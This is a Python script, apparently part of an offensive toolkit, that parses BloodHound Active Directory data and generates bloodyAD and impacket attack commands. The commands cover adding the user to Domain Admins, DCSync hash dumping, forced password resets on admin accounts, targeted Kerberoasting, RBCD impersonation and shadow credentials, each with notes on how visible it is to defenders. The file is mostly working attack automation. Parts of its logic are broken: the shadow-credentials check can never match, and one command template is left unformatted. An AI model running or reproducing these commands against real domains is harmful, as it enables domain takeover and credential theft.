#!/usr/bin/env python3
"""
BloodHound → BloodyAD Automation Script
Parses BloodHound JSON and generates automated exploitation commands

This is the KILLER FEATURE that makes this tool unique!
"""

import json
import sys
import os
from pathlib import Path
from collections import defaultdict
import zipfile

class BloodHoundParser:
    def __init__(self, bh_zip_path, domain, username, dc_ip):
        self.bh_zip_path = bh_zip_path
        self.domain = domain
        self.username = username
        self.dc_ip = dc_ip
        self.users = []
        self.computers = []
        self.groups = []
        self.aces = []
        self.sessions = []
        self.exploitation_commands = []
        
    def extract_and_parse(self):
        """Extract BloodHound ZIP and parse all JSON files"""
        try:
            with zipfile.ZipFile(self.bh_zip_path, 'r') as zip_ref:
                temp_dir = Path('/tmp/bh_extraction')
                temp_dir.mkdir(exist_ok=True)
                zip_ref.extractall(temp_dir)
                
                # Parse all JSON files
                for json_file in temp_dir.glob('*.json'):
                    with open(json_file, 'r') as f:
                        data = json.load(f)
                        
                        # Determine file type and parse accordingly
                        if 'users' in json_file.name.lower():
                            self.users.extend(data.get('users', []))
                        elif 'computers' in json_file.name.lower():
                            self.computers.extend(data.get('computers', []))
                        elif 'groups' in json_file.name.lower():
                            self.groups.extend(data.get('groups', []))
                        elif 'domains' in json_file.name.lower():
                            # Parse domain ACEs
                            for domain in data.get('domains', []):
                                self.aces.extend(domain.get('Aces', []))
                
                return True
        except Exception as e:
            print(f"Error parsing BloodHound data: {e}", file=sys.stderr)
            return False
    
    def find_paths_to_da(self):
        """Find all privilege escalation paths to Domain Admins"""
        paths = []
        
        # Find Domain Admins group
        da_group = None
        for group in self.groups:
            if 'DOMAIN ADMINS' in group.get('Properties', {}).get('name', '').upper():
                da_group = group
                break
        
        if not da_group:
            return paths
        
        # Current user
        current_user = f"{self.username.upper()}@{self.domain.upper()}"
        
        # Simple path finding: Look for direct ACEs
        for user in self.users:
            user_name = user.get('Properties', {}).get('name', '')
            if current_user.lower() in user_name.lower():
                # Check ACEs on this user
                for ace in user.get('Aces', []):
                    paths.append({
                        'source': current_user,
                        'target': ace.get('PrincipalName', ''),
                        'right': ace.get('RightName', ''),
                        'target_type': ace.get('PrincipalType', 'User')
                    })
        
        return paths
    
    def generate_bloodyad_commands(self):
        """Generate BloodyAD exploitation commands based on BloodHound data"""
        commands = []
        
        # 1. Check for GenericAll on groups
        for group in self.groups:
            for ace in group.get('Aces', []):
                if ace.get('RightName') == 'GenericAll':
                    principal = ace.get('PrincipalName', '')
                    if self.username.upper() in principal.upper():
                        group_name = group.get('Properties', {}).get('name', '')
                        
                        if 'DOMAIN ADMINS' in group_name.upper():
                            commands.append({
                                'priority': 'CRITICAL',
                                'type': 'AddMember',
                                'description': f'Add {self.username} to Domain Admins (GenericAll right)',
                                'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add groupMember 'Domain Admins' '{self.username}'",
                                'impact': 'IMMEDIATE DOMAIN ADMIN',
                                'prerequisites': 'None - direct path',
                                'opsec': 'HIGH VISIBILITY - will trigger alerts'
                            })
        
        # 2. Check for WriteDacl on Domain
        for ace in self.aces:
            if ace.get('RightName') == 'WriteDacl':
                principal = ace.get('PrincipalName', '')
                if self.username.upper() in principal.upper():
                    commands.append({
                        'priority': 'CRITICAL',
                        'type': 'DCSync',
                        'description': 'Grant DCSync rights via WriteDacl',
                        'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add dcsync '{self.username}'",
                        'follow_up': f"impacket-secretsdump '{self.domain}/{self.username}:PASSWORD@{self.dc_ip}'",
                        'impact': 'DUMP ALL HASHES (DCSync)',
                        'prerequisites': 'WriteDacl on Domain object',
                        'opsec': 'MEDIUM - DCSync generates event 4662'
                    })
        
        # 3. Check for ForceChangePassword
        for user in self.users:
            for ace in user.get('Aces', []):
                if ace.get('RightName') == 'ForceChangePassword':
                    principal = ace.get('PrincipalName', '')
                    if self.username.upper() in principal.upper():
                        target_user = user.get('Properties', {}).get('samaccountname', '')
                        
                        # Check if target is privileged
                        is_admin = user.get('Properties', {}).get('admincount', False)
                        
                        if is_admin:
                            commands.append({
                                'priority': 'HIGH',
                                'type': 'PasswordReset',
                                'description': f'Reset password of privileged user: {target_user}',
                                'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set password '{target_user}' 'NewP@ssw0rd123!'",
                                'follow_up': f"Use {target_user}:NewP@ssw0rd123! for further access",
                                'impact': 'COMPROMISE ADMIN ACCOUNT',
                                'prerequisites': 'ForceChangePassword right',
                                'opsec': 'HIGH VISIBILITY - password reset logged'
                            })
        
        # 4. Check for GenericWrite (can set SPN for Kerberoasting)
        for user in self.users:
            for ace in user.get('Aces', []):
                if ace.get('RightName') in ['GenericWrite', 'WriteSPN']:
                    principal = ace.get('PrincipalName', '')
                    if self.username.upper() in principal.upper():
                        target_user = user.get('Properties', {}).get('samaccountname', '')
                        
                        commands.append({
                            'priority': 'MEDIUM',
                            'type': 'ForceSPN',
                            'description': f'Set fake SPN on {target_user} for targeted Kerberoasting',
                            'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add servicePrincipalName '{target_user}' 'HTTP/fake.{self.domain}'",
                            'follow_up': f"impacket-GetUserSPNs {self.domain}/{self.username}:'PASSWORD' -dc-ip {self.dc_ip} -request-user {target_user}",
                            'impact': 'TARGETED KERBEROAST',
                            'prerequisites': 'GenericWrite or WriteSPN',
                            'opsec': 'MEDIUM - SPN change may be monitored'
                        })
        
        # 5. Check for Owns relationship
        for user in self.users:
            for ace in user.get('Aces', []):
                if ace.get('RightName') == 'Owns':
                    principal = ace.get('PrincipalName', '')
                    if self.username.upper() in principal.upper():
                        target_user = user.get('Properties', {}).get('samaccountname', '')
                        
                        commands.append({
                            'priority': 'HIGH',
                            'type': 'TakeOwnership',
                            'description': f'Take ownership of {target_user} then modify',
                            'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} set owner '{target_user}' '{self.username}'",
                            'follow_up': f"bloodyAD set password '{target_user}' 'NewPass123!'",
                            'impact': 'FULL CONTROL OF OBJECT',
                            'prerequisites': 'Owns right',
                            'opsec': 'MEDIUM - ownership change logged'
                        })
        
        # 6. Check for computers with RBCD opportunities
        for computer in self.computers:
            for ace in computer.get('Aces', []):
                if ace.get('RightName') in ['GenericAll', 'GenericWrite', 'WriteOwner']:
                    principal = ace.get('PrincipalName', '')
                    if self.username.upper() in principal.upper():
                        target_computer = computer.get('Properties', {}).get('name', '')
                        
                        commands.append({
                            'priority': 'HIGH',
                            'type': 'RBCD',
                            'description': f'Resource-Based Constrained Delegation attack on {target_computer}',
                            'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add rbcd '{target_computer}' 'ATTACKER_COMPUTER$'",
                            'follow_up': "impacket-getST -spn 'cifs/{target_computer}' -impersonate Administrator {domain}/ATTACKER_COMPUTER$",
                            'impact': 'IMPERSONATE ANY USER ON TARGET',
                            'prerequisites': 'Control over target computer object + owned computer account',
                            'opsec': 'LOW - no immediate alerts'
                        })
        
        # 7. Check for AddSelf on groups
        for group in self.groups:
            for ace in group.get('Aces', []):
                if ace.get('RightName') == 'AddSelf':
                    principal = ace.get('PrincipalName', '')
                    if self.username.upper() in principal.upper():
                        group_name = group.get('Properties', {}).get('name', '')
                        
                        commands.append({
                            'priority': 'MEDIUM',
                            'type': 'AddSelf',
                            'description': f'Add yourself to {group_name}',
                            'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add groupMember '{group_name}' '{self.username}'",
                            'impact': f'MEMBERSHIP IN {group_name}',
                            'prerequisites': 'AddSelf right',
                            'opsec': 'MEDIUM - group membership change logged'
                        })
        
        # 8. Check for Shadow Credentials opportunity
        for user in self.users:
            for ace in user.get('Aces', []):
                if ace.get('RightName') in ['GenericAll', 'GenericWrite']:
                    if 'msDS-KeyCredentialLink' in ace.get('RightName', ''):
                        principal = ace.get('PrincipalName', '')
                        if self.username.upper() in principal.upper():
                            target_user = user.get('Properties', {}).get('samaccountname', '')
                            
                            commands.append({
                                'priority': 'HIGH',
                                'type': 'ShadowCredentials',
                                'description': f'Shadow Credentials attack on {target_user}',
                                'command': f"bloodyAD -d {self.domain} -u {self.username} -p 'PASSWORD' --host {self.dc_ip} add shadowCredentials '{target_user}'",
                                'follow_up': "Generates certificate → authenticate as target user",
                                'impact': 'AUTHENTICATE AS TARGET USER',
                                'prerequisites': 'Write access to msDS-KeyCredentialLink',
                                'opsec': 'LOW - stealthy attack'
                            })
        
        # Sort by priority
        priority_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        commands.sort(key=lambda x: priority_order.get(x['priority'], 999))
        
        return commands
    
    def output_json(self):
        """Output results as JSON for bash to consume"""
        result = {
            'domain': self.domain,
            'username': self.username,
            'dc_ip': self.dc_ip,
            'stats': {
                'users': len(self.users),
                'computers': len(self.computers),
                'groups': len(self.groups)
            },
            'exploitation_commands': self.exploitation_commands
        }
        
        print(json.dumps(result, indent=2))

def main():
    if len(sys.argv) < 5:
        print("Usage: bloodhound_parser.py <bh_zip> <domain> <username> <dc_ip>", file=sys.stderr)
        sys.exit(1)
    
    bh_zip = sys.argv[1]
    domain = sys.argv[2]
    username = sys.argv[3]
    dc_ip = sys.argv[4]
    
    if not os.path.exists(bh_zip):
        print(f"Error: BloodHound ZIP not found: {bh_zip}", file=sys.stderr)
        sys.exit(1)
    
    parser = BloodHoundParser(bh_zip, domain, username, dc_ip)
    
    print("[*] Parsing BloodHound data...", file=sys.stderr)
    if not parser.extract_and_parse():
        sys.exit(1)
    
    print(f"[+] Parsed {len(parser.users)} users, {len(parser.computers)} computers, {len(parser.groups)} groups", file=sys.stderr)
    
    print("[*] Analyzing attack paths...", file=sys.stderr)
    parser.exploitation_commands = parser.generate_bloodyad_commands()
    
    print(f"[+] Generated {len(parser.exploitation_commands)} exploitation commands", file=sys.stderr)
    
    # Output JSON for bash
    parser.output_json()

if __name__ == "__main__":
    main()
